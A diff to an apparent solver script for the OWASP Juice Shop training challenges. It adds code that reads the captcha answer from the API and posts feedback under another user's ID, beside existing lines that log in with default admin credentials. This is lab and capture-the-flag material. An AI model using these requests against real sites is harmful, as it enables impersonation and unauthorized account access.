@@ -48,6 +48,12 @@ requests.post(url+'/rest/user/login', data={'email':'support@juice-sh.op','passw
 # ---- Password Strength (Log in with the administrator's user credentials without previously changing them or applying SQL Injection.)
 # See "Login Admin" in this part
 
+# ==== Captcha ===
+from json import loads
+captcha=loads(requests.get(url+'/rest/captcha').text)
+# ---- Forged Feedback (Post some feedback in another users name.)
+requests.post(url+'/api/Feedbacks', data={'UserId':1,'captchaId':captcha['captchaId'],'captcha':captcha['answer'],'comment':'a','rating':0})
+
 # ==== Require to log in (admin account) ===
 session=requests.Session()
 session.post(url+'/rest/user/login', data={'email':'admin@juice-sh.op','password':'admin123'})
